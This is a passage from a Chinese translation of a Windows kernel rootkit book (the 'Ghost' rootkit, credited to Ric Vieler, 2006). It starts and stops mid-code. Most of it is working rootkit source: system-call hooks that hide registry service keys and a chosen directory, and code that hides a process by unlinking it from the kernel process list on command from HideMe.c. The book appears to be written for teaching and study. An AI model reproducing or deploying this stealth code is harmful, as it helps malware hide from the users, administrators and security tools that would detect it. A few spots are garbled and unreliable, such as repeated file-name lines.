// get the name of the key
PUNICODE_STRING pKeyName = NULL;
UNICODE_STRING servicesString = { 0 };
RtlInitUnicodeString( &servicesString, L"Services" );
GetKeyName( *KeyHandle, &pKeyName );
// create special index for the Services key
if( pKeyName )
{
// Using IsSameFile as IsSameKey function
if( IsSameFile( &servicesString, pKeyName ) )
{
DbgPrint("comint32: found g_servicesKey");
CreateHiddenKeyIndices( *KeyHandle );
}
ExFreePool( pKeyName );
}
}
return status;
}
// return number of subkeys from special index
// when the parent key is \\Services
NTSTATUS NewZwQueryKey( IN HANDLE KeyHandle,
IN KEY_INFORMATION_CLASS KeyInformationClass,
OUT PVOID KeyInformation,
IN ULONG Length,
OUT PULONG ResultLength )
{
int status;
ULONG numberOfSubkeys = -1;
status = OldZwQueryKey(
KeyHandle,
KeyInformationClass,
KeyInformation,
Length,
ResultLength );
numberOfSubkeys = GetSubkeyCount( KeyHandle );
if( (status == STATUS_SUCCESS) && (numberOfSubkeys != -1) )
if( KeyFullInformation == KeyInformationClass )
if( KeyInformation )
((KEY_FULL_INFORMATION*)KeyInformation)->SubKeys = numberOfSubkeys;
return status;
}
// return special index values
// when the parent key is \\Services
NTSTATUS NewZwEnumerateKey( IN HANDLE KeyHandle,
IN ULONG Index,
IN KEY_INFORMATION_CLASS KeyInformationClass,
OUT PVOID KeyInformation,
IN ULONG Length,
OUT PULONG ResultLength )
{
int status;
int new_index;
new_index = GetNewIndex( KeyHandle, Index );
if( new_index != -1 )
Index = new_index;
status = OldZwEnumerateKey(
KeyHandle,
Index,
KeyInformationClass,
KeyInformation,
Length,
ResultLength );
return status;
}
GetPointerByHandle 和GetKeyName由NewZwOpenKey 调用来防止在注册表中对每个项都
做映射，使用这些函数使得仅仅名字为" \Services "的项需要被映射，这样可以大幅度地提高
项的隐藏算法效率。如果果是在Windows XP 的家庭版本中，你可能不明白为什么需要这个
额外的步骤,但是如果你是在Windows Server 2003里加载一个包含了很多服务的系统托盘，
你可能已经知道在比较新的系统里广泛地使用到了注册表，如果设计得不正确，就会导致就
算是这样一个简单的项索引算法都会把系统弄得像蜗牛一样慢。
如果项名是\Services，NewZwOpenKey 就会创建一个子项索引，这个子项是专门用来跳过
那些要隐藏的子项的。
NewZwQueryKey 会返回所有子项的数目与隐藏的子项数目之差.
NewZwEnumerateKey 会返回一个子项的索引，但不包括隐藏的子项。
目录的隐藏
在讲了注册表项的隐藏后，目录隐藏似乎有点没意思，仅仅是一个钩子，所有的函数都
可以用几行代码来把它们添加进来。
下面是hookManager.h里添加的:
typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
IN HANDLE hFile,
IN HANDLE hEvent OPTIONAL,
IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
IN PVOID IoApcContext OPTIONAL,
OUT PIO_STATUS_BLOCK pIoStatusBlock,
OUT PVOID FileInformationBuffer,
IN ULONG FileInformationBufferLength,
IN FILE_INFORMATION_CLASS FileInfoClass,
IN BOOLEAN bReturnOnlyOneEntry,
IN PUNICODE_STRING PathMask OPTIONAL,
IN BOOLEAN bRestartQuery );
extern ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;
NTSTATUS NewZwQueryDirectoryFile(
IN HANDLE hFile,
IN HANDLE hEvent OPTIONAL,
IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
IN PVOID IoApcContext OPTIONAL,
OUT PIO_STATUS_BLOCK pIoStatusBlock,
OUT PVOID FileInformationBuffer,
IN ULONG FileInformationBufferLength,
IN FILE_INFORMATION_CLASS FileInfoClass,
IN BOOLEAN bReturnOnlyOneEntry,
IN PUNICODE_STRING PathMask OPTIONAL,
IN BOOLEAN bRestartQuery );
NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
IN HANDLE hFile,
IN HANDLE hEvent OPTIONAL,
IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
IN PVOID IoApcContext OPTIONAL,
OUT PIO_STATUS_BLOCK pIoStatusBlock,
OUT PVOID FileInformationBuffer,
IN ULONG FileInformationBufferLength,
IN FILE_INFORMATION_CLASS FileInfoClass,
IN BOOLEAN bReturnOnlyOneEntry,
IN PUNICODE_STRING PathMask OPTIONAL,
IN BOOLEAN bRestartQuery );
下面是Ghost.c里面添加的:
ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;
Here is the addition to OnUnload of Ghost.cUNHOOK( ZwQueryDirectoryFile,
OldZwQueryDirectoryFile );
Here is the addition to HookKernel in hookManager.c:HOOK( ZwQueryDirectoryFile,
NewZwQueryDirectoryFile,
OldZwQueryDirectoryFile );
下面是 hookManager.c 里面实现钩子的部分：
NTSTATUS NewZwQueryDirectoryFile(
IN HANDLE hFile,
IN HANDLE hEvent OPTIONAL,
IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
IN PVOID IoApcContext OPTIONAL,
OUT PIO_STATUS_BLOCK pIoStatusBlock,
OUT PVOID FileInformationBuffer,
IN ULONG FileInformationBufferLength,
IN FILE_INFORMATION_CLASS FileInfoClass,
IN BOOLEAN bReturnOnlyOneEntry,
IN PUNICODE_STRING PathMask OPTIONAL,
IN BOOLEAN bRestartQuery
)
{
NTSTATUS status;
status = OldZwQueryDirectoryFile(
hFile,
hEvent,
IoApcRoutine,
IoApcContext,
pIoStatusBlock,
FileInformationBuffer,
FileInformationBufferLength,
FileInfoClass,
bReturnOnlyOneEntry,
PathMask,
bRestartQuery);
if( NT_SUCCESS( status ) && (FileInfoClass == 3) )
{
BOOL isLastDirectory;
DirEntry* pLastDirectory = NULL;
DirEntry* pThisDirectory = (DirEntry*)FileInformationBuffer;
// for each directory entry in the list
do
{
isLastDirectory = !( pThisDirectory->dwLenToNext );
// compare with g_hiddenDirectoryName
if( RtlCompareMemory( (PVOID)&pThisDirectory->suName[ 0 ],
(PVOID)&g_hiddenDirectoryName[ 0 ],
HIDDEN_DIR_NAME_LENGTH ) == HIDDEN_DIR_NAME_LENGTH )
{
if( isLastDirectory )
{
// return STATUS_NO_MORE_FILES if the hidden
// directory is the only directory in the list
// else set the previous directory to end-of-list
// if hidden directory is at the end of the list
if( pThisDirectory == (DirEntry*)FileInformationBuffer )
status = 0x80000006;
else
pLastDirectory->dwLenToNext = 0;
break;
}
else
{
// copy remainder of directory list into this location
// to eliminate this directory entry from the list
int offset = ((ULONG)pThisDirectory) - (ULONG)FileInformationBuffer;
int size = (DWORD)FileInformationBufferLength –
offset - pThisDirectory->dwLenToNext;
RtlCopyMemory( (PVOID)pThisDirectory,
(PVOID)((char*)pThisDirectory + pThisDirectory->dwLenToNext ),
(DWORD)size );
continue;
}
}
pLastDirectory = pThisDirectory;
pThisDirectory = (DirEntry*)((char *)pThisDirectory +
pThisDirectory->dwLenToNext );
} while( !isLastDirectory );
}
return( status );
}
这个函数只是简单地检查是否是之前定义的目录名称，如果是的话就把它从目录列表中移
除。实际上有三种方法可以从目录列表中移除一个目录：如果此目录是列表中的惟一个项，
函数直接返回STATUS_NO_MORE_FILES。如果此目录是列表中的最后一项，函数会修改
倒数笫二项以将它标记为目录列表的最后一项。最后，如果此目录是在其它的地方，目录列
表中的其余部分会被复制来覆盖掉要隐藏的目录项。
在NewZwQueryDirectoryFile 里还有一个没有讲的就是这个新函数的条件边界判断里
“&&(FileInfoClass == 3)”的使用，事实证明操作系统用 ZwQueryDirectoryFile 针对的不仅
仅是文件系统目录对象，但是我们写的这个钩子仅仅是要处理 FileInfoClass = 3 的情况。
进程的隐藏
正如我们的 rootkit 可以从设备驱动的链表中移除的一样，隐藏进程也可以通过在进程
链表中移除指定的项来实现。本节中提供的实现方法是使用进程ID在进程链表中查找这个
进程，然后设置链表的指针来移除指定的进程条目，这需要进程来告诉 rootkit 它的ID是什
么，好在,我们的rootkit已经有了一个命令行接口，所以实现这个函数只是需要稍微地修改一
下现有的文件就行了，虽然我们还要创建一个新的文件来测试这个进程隐藏功能。这个文件
命名为 HdeMe.c。进程隐藏如图9-1所示。
9-1
HideMe.c
HideMe.c
HideMe.c
HideMe.c
文件 HideMe.c 先获取自己的系统 ID 然后通过在笫5章实现的 I/O 机制发送给我们的 rootkit。
// HideMe
// Copyright Ric Vieler, 2006
// Send a hide command to MyDeviceDriver
// and wait for operator to stop the process
#include 
#include 
#include 
#include "IoManager.h"
void main(int argc, char *argv[])
{
HANDLE deviceHandle;
GHOST_IOCTLDATA control = { 0 };
ULONG status = 0;
deviceHandle = CreateFile( GHOST_DEVICE_OPEN_NAME,
GENERIC_READ | GENERIC_WRITE,
0,
NULL,
OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL,
NULL);
if( deviceHandle == INVALID_HANDLE_VALUE )
{
printf ("Could not find MyDeviceDriver.\n");
}
else
{
control.processId = GetCurrentProcessId();
if( DeviceIoControl(deviceHandle,
GHOST_HIDE_COMMAND,
&control,
sizeof(control), // input
(PVOID)&control,
sizeof(control), // output
&status,
NULL ) )
printf ("MyDeviceDriver hiding this process (0x%x).\n",
control.processId );
else
printf ("DeviceIoControl failed.\n");
CloseHandle(deviceHandle);
}
printf ("Press any key to terminate this process..." );
getch();
printf ("\n" );
}
下面是添加到 IoManager.h 里的:
typedef struct
{
int command;
DWORD processId;
} GHOST_IOCTLDATA;
#define
GHOST_HIDE_COMMAND
CTL_CODE(FILE_DEVICE_UNKNOWN,
0x802,
METHOD_BUFFERED,
FILE_ANY_ACCESS)
DWORD 类 型 的
processId 是 在 GHOST_IOCTLDATA 结 构 添 加 的 ， GHOST_HIDE_
COMMAND 命令是在命令列表里添加的，这允许程序通过包含 IoManager.h 来达到隐藏进
程的目的。
下面是添加到IoManager.c里面的代码：
extern DWORD listOffset;
// used by GHOST_HIDE_COMMAND
DWORD findProcess ( DWORD targetProcessId )
{
int loop = 0;
DWORD eProcess;
DWORD firstProcess;
DWORD nextProcess;
PLIST_ENTRY processList;
if ( targetProcessId == 0 )
return 0;
// Get the process list
eProcess = (DWORD)PsGetCurrentProcess();
// Traverse the process list
firstProcess = *((DWORD*)(eProcess + (listOffset - 4)));
nextProcess = firstProcess;
for(;;)
{
if(targetProcessId == nextProcess)
{
// found the process
break;
}
else if( loop && (nextProcess == firstProcess) )
{
// circled without finding the process
eProcess = 0;
break;
}
else
{
// get the next process
processList = (LIST_ENTRY*)(eProcess + listOffset);
if( processList->Flink == 0 )
{
DbgPrint ("comint32: findProcess no Flink!");
break;
}
eProcess = (DWORD)processList->Flink;
eProcess = eProcess - listOffset;
nextProcess = *((DWORD*)(eProcess + (listOffset - 4)));
}
loop++;
}
return eProcess;
}
// Process commands from external applications
NTSTATUS
OnDeviceControl( PFILE_OBJECT FileObject, BOOLEAN Wait,
PVOID InputBuffer, ULONG InputBufferLength,
PVOID OutputBuffer, ULONG OutputBufferLength,
ULONG IoControlCode, PIO_STATUS_BLOCK IoStatus,
PDEVICE_OBJECT DeviceObject )
{
GHOST_IOCTLDATA* pControlData;
DWORD eProcess;
PLIST_ENTRY processList;
IoStatus->Status
= STATUS_SUCCESS;